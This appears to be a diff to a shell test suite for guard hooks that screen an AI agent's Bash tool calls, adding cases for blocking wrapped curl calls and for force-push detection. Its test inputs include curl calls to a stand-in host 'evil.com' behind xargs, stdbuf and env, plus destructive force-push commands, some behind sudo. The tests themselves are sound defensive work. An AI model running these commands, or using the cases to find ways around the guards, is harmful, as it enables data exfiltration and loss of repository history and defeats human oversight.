@@ -243,6 +243,7 @@ assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"doas -a bsdaut
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs --max-args 1 curl http://evil.com"}}'                             "blocks past xargs --max-args's separate-value arg (#212)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"stdbuf --output L curl http://evil.com"}}'                              "blocks past stdbuf --output's separate-value arg (#212)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"env -u FOO curl http://evil.com"}}'                                     "blocks past env -u's separate-value arg (#212)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"xargs -a items.txt curl http://evil.com"}}'                              "blocks past xargs -a's separate-value arg (#217)"
 # #127: the bare `create_connection` NET_RE alternative (and its boundary-less neighbors) matched
 # any identifier containing the substring, not just a real call — anchor with \b (+ call-paren for
 # the bare form) so an identifier merely containing the token doesn't false-positive block.
@@ -438,6 +439,22 @@ assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\"
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -o ci.skip -f origin scratch\"}}" "blocks a force-push with a push-option value token before -f (#237)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push --force-with-lease origin scratch\"}}" "allows --force-with-lease — git's own safe form (#230)"
 assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch\"}}"     "allows a non-force push (#230)"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push origin scratch -ofield=1\"}}" "allows a non-force push with a glued push-option value containing an 'f' byte, not misread as -f (#246)"
+assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -f origin scratch -ofield=1\"}}" "still blocks a real force-push alongside a glued push-option value (#246)"
+
+# #245: a bundled -fd (force+delete) must be recognized as an out-of-scope delete-push (a
+# different risk not handled by this fast-forward/ancestor check), not evaluated as an ordinary
+# force-push — which, for a diverged branch like this one, would otherwise wrongly block it.
+git -C "$dgrepo" checkout -q -b delbranch
+echo d > "$dgrepo/d.txt"
+git -C "$dgrepo" add d.txt
+git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "delbranch commit"
+git -C "$dgrepo" push -q origin delbranch
+git -C "$dgrepo" reset -q --hard HEAD~1
+echo e > "$dgrepo/e.txt"
+git -C "$dgrepo" add e.txt
+git -C "$dgrepo" -c user.email=t@t -c user.name=t commit -q -m "delbranch divergent commit"
+assert_exit 0 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"git push -fd origin delbranch\"}}" "recognizes a bundled -fd as an out-of-scope delete-push, not a force-push needing a fast-forward check (#245)"
 
 # wrapper/prefix + fail-open/ignore contract, same shape as the other rails
 assert_exit 2 "$BDG" "{\"tool_name\":\"Bash\",\"cwd\":\"$dgrepo\",\"tool_input\":{\"command\":\"sudo git push -f origin scratch\"}}" "blocks a destructive push behind a sudo prefix (#230)"
